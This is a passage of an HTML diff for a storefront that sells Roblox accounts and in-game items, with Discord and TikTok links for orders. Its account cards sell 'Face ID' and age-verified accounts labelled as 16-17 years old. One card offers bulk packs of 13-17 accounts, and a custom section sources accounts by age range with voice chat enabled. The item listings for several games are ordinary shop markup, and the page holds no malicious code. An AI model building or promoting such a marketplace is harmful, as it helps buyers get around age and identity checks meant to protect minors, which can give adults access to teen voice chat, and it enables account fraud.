+                        <div class="absolute top-4 right-4 flex flex-col gap-2">
+                            <span class="age-verified-badge px-3 py-1 rounded-full text-xs">AGE VERIFIED</span>
+                            <span class="face-id-badge px-3 py-1 rounded-full text-xs text-white">FACE ID</span>
+                        </div>
+                        <div class="w-full h-48 bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl mb-6 flex items-center justify-center relative overflow-hidden border border-white/10">
+                            <span class="text-6xl">🎓</span>
+                            <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
+                                <span class="text-purple-400 font-bold text-sm">16-17 Years Old</span>
+                            </div>
+                        </div>
+                        <h3 class="text-2xl font-bold mb-2 font-orbitron">16-17 Year Verified</h3>
+                        <p class="text-gray-300 mb-4 text-sm">Face ID + Age verified • 16-17 Years • Higher trust • Voice chat</p>
+                        <div class="flex items-center justify-between mb-4">
+                            <div class="bg-white/10 px-4 py-2 rounded-lg border border-cyan-500/30">
+                                <span class="text-2xl font-bold robux-price">$20 Robux</span>
+                            </div>
+                            <span class="text-gray-400 text-sm">Stock: 5</span>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-cyan-600 to-blue-600 rounded-lg font-bold hover:from-cyan-500 hover:to-blue-500 transition-all pointer-events-none shadow-lg shadow-cyan-500/20">
+                            Buy Now
+                        </button>
+                    </div>
+
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden group" onclick="openPurchaseModal('Premium 16-17 Account', '$35 Robux')">
+                        <div class="absolute top-4 right-4 flex flex-col gap-2">
+                            <span class="age-verified-badge px-3 py-1 rounded-full text-xs">AGE VERIFIED</span>
+                            <span class="face-id-badge px-3 py-1 rounded-full text-xs text-white">FACE ID</span>
+                        </div>
+                        <div class="w-full h-48 bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl mb-6 flex items-center justify-center relative overflow-hidden border border-white/10">
+                            <span class="text-6xl">👑</span>
+                            <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
+                                <span class="text-yellow-400 font-bold text-sm">Premium + 16-17</span>
+                            </div>
+                        </div>
+                        <h3 class="text-2xl font-bold mb-2 font-orbitron">Premium 16-17 Account</h3>
+                        <p class="text-gray-300 mb-4 text-sm">Face ID verified • Age 16-17 • Active Premium 2200 • Voice chat</p>
+                        <div class="flex items-center justify-between mb-4">
+                            <div class="bg-white/10 px-4 py-2 rounded-lg border border-cyan-500/30">
+                                <span class="text-2xl font-bold robux-price">$35 Robux</span>
+                            </div>
+                            <span class="text-red-400 text-sm font-bold">Low Stock</span>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-cyan-600 to-blue-600 rounded-lg font-bold hover:from-cyan-500 hover:to-blue-500 transition-all pointer-events-none shadow-lg shadow-cyan-500/20">
+                            Buy Now
+                        </button>
+                    </div>
+
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden group md:col-span-2 lg:col-span-1" onclick="openPurchaseModal('Bulk Verified Pack', '$75 Robux')">
+                        <div class="absolute top-4 right-4 flex flex-col gap-2">
+                            <span class="age-verified-badge px-3 py-1 rounded-full text-xs">AGE VERIFIED</span>
+                            <span class="face-id-badge px-3 py-1 rounded-full text-xs text-white">FACE ID</span>
+                        </div>
+                        <div class="w-full h-48 bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl mb-6 flex items-center justify-center relative overflow-hidden border border-white/10">
+                            <span class="text-6xl">📦</span>
+                            <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
+                                <span class="text-green-400 font-bold text-sm">Mixed Ages 13-17</span>
+                            </div>
+                        </div>
+                        <h3 class="text-2xl font-bold mb-2 font-orbitron">Bulk Verified Pack</h3>
+                        <p class="text-gray-300 mb-4 text-sm">5x accounts • Mix of 13-15 & 16-17 • All Face ID + Age verified</p>
+                        <div class="flex items-center justify-between mb-4">
+                            <div class="bg-white/10 px-4 py-2 rounded-lg border border-cyan-500/30">
+                                <span class="text-2xl font-bold robux-price">$75 Robux</span>
+                                <span class="text-sm text-gray-400 line-through ml-2">$100</span>
+                            </div>
+                            <span class="text-gray-400 text-sm">Save $25</span>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-cyan-600 to-blue-600 rounded-lg font-bold hover:from-cyan-500 hover:to-blue-500 transition-all pointer-events-none shadow-lg shadow-cyan-500/20">
+                            Buy Now
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <div class="section-divider"></div>
+
+        <!-- ITEMS SECTION -->
+        <section id="items-section" class="relative z-10 px-4 pb-20 hidden">
+            <div class="max-w-7xl mx-auto">
+                <div class="flex items-center justify-between mb-12">
+                    <h2 class="text-4xl font-orbitron font-bold flex items-center gap-3">
+                        <span class="w-2 h-8 bg-purple-500 rounded-full shadow-[0_0_10px_#bc13fe]"></span>
+                        GAME ITEMS
+                    </h2>
+                    <div class="flex gap-2">
+                        <span class="sale-badge px-3 py-1 rounded-full text-sm text-white font-bold">🔥 SALE ACTIVE</span>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                    
+                    <!-- Blox Fruits Shop -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden lg:col-span-2">
+                        <div class="absolute top-0 right-0 w-32 h-32 bg-red-500/20 rounded-full blur-3xl"></div>
+                        <div class="flex items-center gap-4 mb-6">
+                            <div class="w-16 h-16 bg-gradient-to-br from-red-500 to-orange-600 rounded-xl flex items-center justify-center text-3xl shadow-lg shadow-red-500/30">
+                                🍎
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-bold font-orbitron text-red-400">BLOX FRUITS SHOP</h3>
+                                <p class="text-gray-300 text-sm">Gamepasses • Notifiers • Boosts</p>
+                            </div>
+                            <div class="ml-auto">
+                                <span class="sale-badge px-3 py-1 rounded-full text-xs text-white">UP TO 50% OFF</span>
+                            </div>
+                        </div>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 mb-6">
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('Fruit Notifier', '$16.88')">
+                                <div>
+                                    <span class="font-semibold text-red-300">Fruit Notifier</span>
+                                    <span class="discount-badge px-2 py-0.5 rounded text-xs ml-2">50% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs">$33.76</span>
+                                    <span class="text-red-400 font-bold">$16.88</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('Dark Blade', '$7.50')">
+                                <div>
+                                    <span class="font-semibold text-red-300">Dark Blade</span>
+                                    <span class="discount-badge px-2 py-0.5 rounded text-xs ml-2">50% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs">$15.00</span>
+                                    <span class="text-red-400 font-bold">$7.50</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('2x Mastery', '$4.22')">
+                                <div>
+                                    <span class="font-semibold text-red-300">2x Mastery</span>
+                                    <span class="discount-badge px-2 py-0.5 rounded text-xs ml-2">25% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs">$5.63</span>
+                                    <span class="text-red-400 font-bold">$4.22</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('2x Money', '$4.22')">
+                                <div>
+                                    <span class="font-semibold text-red-300">2x Money</span>
+                                    <span class="discount-badge px-2 py-0.5 rounded text-xs ml-2">25% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs">$5.63</span>
+                                    <span class="text-red-400 font-bold">$4.22</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('2x Boss Drops', '$3.50')">
+                                <div>
+                                    <span class="font-semibold text-red-300">2x Boss Drops</span>
+                                    <span class="discount-badge px-2 py-0.5 rounded text-xs ml-2">20% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs">$4.38</span>
+                                    <span class="text-red-400 font-bold">$3.50</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('Fast Boats', '$3.50')">
+                                <div>
+                                    <span class="font-semibold text-red-300">Fast Boats</span>
+                                    <span class="discount-badge px-2 py-0.5 rounded text-xs ml-2">20% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs">$4.38</span>
+                                    <span class="text-red-400 font-bold">$3.50</span>
+                                </div>
+                            </div>
+                        </div>
+                        <button onclick="openPurchaseModal('Blox Fruits Items', 'Variable')" class="w-full py-3 bg-gradient-to-r from-red-600 to-orange-600 rounded-lg font-bold hover:from-red-500 hover:to-orange-500 transition-all pointer-events-none shadow-lg shadow-red-500/20">
+                            Buy Blox Fruits Items
+                        </button>
+                    </div>
+
+                    <!-- Baddies Items -->
+                    <div class="product-card baddies-card relative rounded-2xl p-6 overflow-hidden" onclick="openPurchaseModal('Baddies Items', 'Variable')">
+                        <div class="absolute top-0 right-0 w-32 h-32 bg-pink-500/30 rounded-full blur-3xl"></div>
+                        <div class="flex items-center gap-4 mb-6">
+                            <div class="w-16 h-16 bg-gradient-to-br from-pink-400 to-rose-500 rounded-xl flex items-center justify-center text-3xl shadow-lg shadow-pink-500/40">
+                                💅
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-bold font-orbitron baddies-text">BADDIES</h3>
+                                <p class="text-pink-200 text-sm">VIP • Gamepasses • Items</p>
+                            </div>
+                            <div class="ml-auto">
+                                <span class="px-3 py-1 rounded-full text-xs text-white font-bold bg-pink-500 shadow-lg shadow-pink-500/50">SALE</span>
+                            </div>
+                        </div>
+                        <div class="space-y-3 mb-6">
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Permanent Dog Leash (899 Tier)', '$5.62')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Permanent Dog Leash (899 Tier)</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">50% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$11.24</span>
+                                    <span class="text-pink-300 font-bold">$5.62</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Baddies V.I.P', '$10.00')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Baddies V.I.P</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">NEW PRICE</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$9.99</span>
+                                    <span class="text-pink-300 font-bold">$10.00</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Rollerskates', '$10.00')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Rollerskates</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">NEW PRICE</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$110.00</span>
+                                    <span class="text-pink-300 font-bold">$10.00</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Permanent Heels (599 Tier)', '$5.24')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Permanent Heels (599 Tier)</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">30% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$7.49</span>
+                                    <span class="text-pink-300 font-bold">$5.24</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Fish Slap', '$3.99')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Fish Slap</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">20% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$4.99</span>
+                                    <span class="text-pink-300 font-bold">$3.99</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Gorila Snure', '$2.11')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Gorila Snure</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">15% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$2.48</span>
+                                    <span class="text-pink-300 font-bold">$2.11</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Money Gun', '$2.24')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Money Gun</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">10% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$2.49</span>
+                                    <span class="text-pink-300 font-bold">$2.24</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Boombox', '$2.24')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Boombox</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">10% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$2.49</span>
+                                    <span class="text-pink-300 font-bold">$2.24</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Hair Dryer', '$2.24')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Hair Dryer</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">10% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$2.49</span>
+                                    <span class="text-pink-300 font-bold">$2.24</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-pink-950/30 rounded-lg border border-pink-400/30" onclick="event.stopPropagation(); openPurchaseModal('Permanent Make Up (199 Tier)', '$2.24')">
+                                <div>
+                                    <span class="font-semibold text-pink-200">Permanent Make Up (199 Tier)</span>
+                                    <span class="bg-pink-500/20 text-pink-300 border border-pink-400/50 px-2 py-0.5 rounded text-xs ml-2">10% OFF</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="price-original block text-xs text-pink-400">$2.49</span>
+                                    <span class="text-pink-300 font-bold">$2.24</span>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-pink-500 to-rose-500 rounded-lg font-bold hover:from-pink-400 hover:to-rose-400 transition-all shadow-lg shadow-pink-500/30 pointer-events-none">
+                            Buy Baddies Items
+                        </button>
+                    </div>
+
+                    <!-- Murder Mystery 2 -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden" onclick="openPurchaseModal('MM2 Items', 'Variable')">
+                        <div class="absolute top-0 right-0 w-32 h-32 bg-gray-500/20 rounded-full blur-3xl"></div>
+                        <div class="flex items-center gap-4 mb-6">
+                            <div class="w-16 h-16 bg-gradient-to-br from-gray-600 to-red-600 rounded-xl flex items-center justify-center text-3xl shadow-lg shadow-red-500/20">
+                                🔪
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-bold font-orbitron text-gray-300">MURDER MYSTERY 2</h3>
+                                <p class="text-gray-300 text-sm">Godlys • Ancients • Chromas</p>
+                            </div>
+                        </div>
+                        <div class="space-y-3 mb-6">
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-gray-500/20" onclick="event.stopPropagation(); openPurchaseModal('MM2 Icewing', '$35 Robux')">
+                                <span class="font-semibold text-gray-200">Icewing</span>
+                                <span class="text-cyan-400 font-bold robux-price">$35 Robux</span>
+                            </div>
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-gray-500/20" onclick="event.stopPropagation(); openPurchaseModal('MM2 Ghost Blade', '$15 Robux')">
+                                <span class="font-semibold text-gray-200">Ghost Blade</span>
+                                <span class="text-cyan-400 font-bold robux-price">$15 Robux</span>
+                            </div>
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-gray-500/20" onclick="event.stopPropagation(); openPurchaseModal('MM2 Gingerbread Gun', '$10 Robux')">
+                                <span class="font-semibold text-gray-200">Gingerbread Gun</span>
+                                <span class="text-cyan-400 font-bold robux-price">$10 Robux</span>
+                            </div>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-gray-600 to-red-600 rounded-lg font-bold hover:from-gray-500 hover:to-red-500 transition-all pointer-events-none shadow-lg shadow-red-500/20">
+                            Buy MM2 Items
+                        </button>
+                    </div>
+
+                    <!-- Forsaken -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden" onclick="openPurchaseModal('Forsaken Items', 'Variable')">
+                        <div class="absolute top-0 right-0 w-32 h-32 bg-indigo-500/20 rounded-full blur-3xl"></div>
+                        <div class="flex items-center gap-4 mb-6">
+                            <div class="w-16 h-16 bg-gradient-to-br from-purple-600 to-indigo-600 rounded-xl flex items-center justify-center text-3xl shadow-lg shadow-indigo-500/20">
+                                👻
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-bold font-orbitron text-indigo-400">FORSAKEN</h3>
+                                <p class="text-gray-300 text-sm">Skins • Emotes • Boosts</p>
+                            </div>
+                        </div>
+                        <div class="space-y-3 mb-6">
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-indigo-500/20" onclick="event.stopPropagation(); openPurchaseModal('Forsaken Legendary Skin', '$10.00')">
+                                <span class="font-semibold text-gray-200">Legendary Skin</span>
+                                <span class="text-indigo-400 font-bold">$10.00</span>
+                            </div>
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-indigo-500/20" onclick="event.stopPropagation(); openPurchaseModal('Forsaken Emote Pack', '$5.00')">
+                                <span class="font-semibold text-gray-200">Emote Pack</span>
+                                <span class="text-indigo-400 font-bold">$5.00</span>
+                            </div>
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-indigo-500/20" onclick="event.stopPropagation(); openPurchaseModal('Forsaken XP Boost', '$8.00')">
+                                <span class="font-semibold text-gray-200">XP Boost x10</span>
+                                <span class="text-indigo-400 font-bold">$8.00</span>
+                            </div>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-purple-600 to-indigo-600 rounded-lg font-bold hover:from-purple-500 hover:to-indigo-500 transition-all pointer-events-none shadow-lg shadow-indigo-500/20">
+                            Buy Forsaken Items
+                        </button>
+                    </div>
+
+                    <!-- Custom Orders -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden border-2 border-dashed border-cyan-500/50" onclick="window.open('https://www.tiktok.com/@bloxvault5', '_blank')">
+                        <div class="absolute inset-0 bg-gradient-to-br from-cyan-500/10 to-purple-500/10"></div>
+                        <div class="relative z-10 flex flex-col items-center justify-center h-full text-center py-8">
+                            <div class="w-20 h-20 bg-gradient-to-br from-cyan-400 to-purple-600 rounded-full flex items-center justify-center text-4xl mb-4 animate-bounce shadow-lg shadow-cyan-500/30">
+                                💬
+                            </div>
+                            <h3 class="text-2xl font-bold font-orbitron mb-2">OTHER GAMES?</h3>
+                            <p class="text-gray-300 mb-6">Need items for a different game or custom order?</p>
+                            <div class="inline-flex items-center gap-2 px-8 py-4 bg-gradient-to-r from-cyan-600 to-purple-600 rounded-full font-bold text-lg hover:scale-105 transition-transform pointer-events-none shadow-lg shadow-cyan-500/30">
+                                <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/></svg>
+                                DM on TikTok
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+        <!-- CUSTOM ACCOUNTS SECTION (NEW) -->
+        <section id="custom-section" class="relative z-10 px-4 pb-20 hidden">
+            <div class="max-w-7xl mx-auto">
+                <div class="flex items-center justify-between mb-12">
+                    <h2 class="text-4xl font-orbitron font-bold flex items-center gap-3">
+                        <span class="w-2 h-8 bg-yellow-400 rounded-full shadow-[0_0_10px_#ffeb3b]"></span>
+                        CUSTOM ACCOUNTS
+                    </h2>
+                    <div class="flex gap-2">
+                        <span class="px-3 py-1 bg-yellow-500/20 text-yellow-400 rounded-full text-sm border border-yellow-500/30">✨ REQUEST CUSTOM</span>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                    
+                    <!-- Custom Request Card -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden border-2 border-dashed border-yellow-500/50 lg:col-span-2" onclick="window.open('https://discord.gg/2mr7dEP3f', '_blank')">
+                        <div class="absolute inset-0 bg-gradient-to-br from-yellow-500/10 to-orange-500/10"></div>
+                        <div class="relative z-10 flex flex-col items-center justify-center h-full text-center py-12">
+                            <div class="w-24 h-24 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center text-5xl mb-6 animate-pulse shadow-lg shadow-yellow-500/30">
+                                ✨
+                            </div>
+                            <h3 class="text-3xl font-bold font-orbitron mb-4 text-yellow-400">REQUEST CUSTOM ACCOUNT</h3>
+                            <p class="text-gray-300 mb-6 text-lg max-w-xl">Need a specific account type, age, or features? We can source custom accounts based on your requirements.</p>
+                            <div class="space-y-3 text-left bg-black/30 p-6 rounded-xl border border-yellow-500/30 mb-6 w-full max-w-lg">
+                                <p class="text-yellow-200 flex items-center gap-2"><span class="text-green-400">✓</span> Specific age ranges</p>
+                                <p class="text-yellow-200 flex items-center gap-2"><span class="text-green-400">✓</span> Premium status</p>
+                                <p class="text-yellow-200 flex items-center gap-2"><span class="text-green-400">✓</span> Specific usernames</p>
+                                <p class="text-yellow-200 flex items-center gap-2"><span class="text-green-400">✓</span> Voice chat ready</p>
+                                <p class="text-yellow-200 flex items-center gap-2"><span class="text-green-400">✓</span> Verified only</p>
+                            </div>
+                            <a href="https://discord.gg/2mr7dEP3f" target="_blank" class="inline-flex items-center gap-2 px-8 py-4 bg-gradient-to-r from-yellow-500 to-orange-500 rounded-full font-bold text-lg hover:scale-105 transition-transform shadow-lg shadow-yellow-500/30">
+                                <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/></svg>
+                                Request on Discord
+                            </a>
+                        </div>
+                    </div>
+
+                    <!-- Blox Fruits Accounts (NEW) -->
+                    <div class="product-card relative rounded-2xl p-6 overflow-hidden border-2 border-red-500/50">
+                        <div class="absolute top-0 right-0 w-32 h-32 bg-red-500/20 rounded-full blur-3xl"></div>
+                        <div class="flex items-center gap-4 mb-6">
+                            <div class="w-16 h-16 bg-gradient-to-br from-red-500 to-orange-600 rounded-xl flex items-center justify-center text-3xl shadow-lg shadow-red-500/30">
+                                🍎
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-bold font-orbitron text-red-400">BLOX FRUITS ACCOUNTS</h3>
+                                <p class="text-gray-300 text-sm">Pre-made • High Level • Fruits</p>
+                            </div>
+                        </div>
+                        
+                        <div class="space-y-3 mb-6">
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('Blox Fruits Starter Account', '$10 Robux')">
+                                <div>
+                                    <span class="font-semibold text-red-300">Starter Account</span>
+                                    <span class="text-xs text-gray-400 block">Level 1-100 • Random Fruit</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-red-400 font-bold robux-price">$10 Robux</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('Blox Fruits Mid Account', '$25 Robux')">
+                                <div>
+                                    <span class="font-semibold text-red-300">Mid Account</span>
+                                    <span class="text-xs text-gray-400 block">Level 100-500 • Good Fruit</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-red-400 font-bold robux-price">$25 Robux</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('Blox Fruits High Account', '$50 Robux')">
+                                <div>
+                                    <span class="font-semibold text-red-300">High Account</span>
+                                    <span class="text-xs text-gray-400 block">Level 500-1000 • Mythical Fruit</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-red-400 font-bold robux-price">$50 Robux</span>
+                                </div>
+                            </div>
+                            
+                            <div class="item-row flex justify-between items-center p-3 bg-black/30 rounded-lg border border-red-500/20" onclick="event.stopPropagation(); openPurchaseModal('Blox Fruits Max Account', '$100 Robux')">
+                                <div>
+                                    <span class="font-semibold text-red-300">Max Account</span>
+                                    <span class="text-xs text-gray-400 block">Max Level • Best Fruits • Rich</span>
+                                </div>
+                                <div class="text-right">
+                                    <span class="text-red-400 font-bold robux-price">$100 Robux</span>
+                                </div>
+                            </div>
+                        </div>
+                        <button class="w-full py-3 bg-gradient-to-r from-red-600 to-orange-600 rounded-lg font-bold hover:from-red-500 hover:to-orange-500 transition-all pointer-events-none shadow-lg shadow-red-500/20">
+                            Buy Blox Fruits Accounts
+                        </button>
+                    </div>
+
+                </div>
+            </div>
+        </section>
+
+        <!-- BRAIN ROT SECTION (Tsunami) -->
+        <section id="brainrot-section" class="relative z-10 px-4 pb-20 hidden">
+            <div class="max-w-7xl mx-auto">
+                <div class="flex items-center justify-between mb-12">
+                    <h2 class="text-4xl font-orbitron font-bold flex items-center gap-3">
+                        <span class="w-2 h-8 bg-green-400 rounded-full shadow-[0_0_10px_#00ff88]"></span>
+                        BRAIN ROT <span class="text-green-400 text-2xl">(TSUNAMI)</span>
+                    </h2>
+                    <div class="flex gap-2">
+                        <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm border border-green-500/30">🌊 RARE ITEMS</span>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                    
+                    <!-- Tsunami Items -->
+                    <div class="product-card brainrot-card relative rounded-2xl p-6 overflow-hidden lg:col-span-2" onclick="openPurchaseModal('Tsunami Items', 'Variable')">
+                        <div class="absolute top-0 right-0 w-32 h-32 bg-green-500/20 rounded-full blur-3xl"></div>
+                        <div class="flex items-center gap-4 mb-6">
+                            <div class="w-16 h-16 bg-gradient-to-br from-green-400 to-cyan-500 rounded-xl flex items-center justify-center text-3xl shadow-lg shadow-green-500/30">
+                                🌊
+                            </div>
+                            <div>
+                                <h3 class="text-2xl font-bold font-orbitron brainrot-text">TSUNAMI</h3>
+                                <p class="text-green-200 text-sm">Brain Rot Collection • Rare Items</p>
+                            </div>
+                            <div class="ml-auto">
